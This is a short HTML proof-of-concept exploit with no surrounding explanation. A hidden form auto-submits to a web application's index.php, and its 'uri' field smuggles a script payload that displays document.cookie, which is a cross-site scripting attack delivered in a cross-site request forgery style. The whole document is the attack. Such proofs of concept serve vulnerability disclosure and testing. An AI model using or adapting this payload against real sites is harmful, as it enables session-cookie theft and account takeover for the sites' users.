<form action="http://host/index.php" method="post" name="main" enctype="multipart/form-data" >
<input type="hidden" name="uri" value='http://1"><script>alert(document.cookie)</script>' />
<input type="hidden" name="validate_uri" value="Check It" />
<input type="hidden" name="MAX_FILE_SIZE" value="52428800" />
<input type="hidden" name="uploadfile"; filename="" />
<input type="hidden" name="gid[]" value="8" />
</form>
<script>
document.main.submit();
</script>
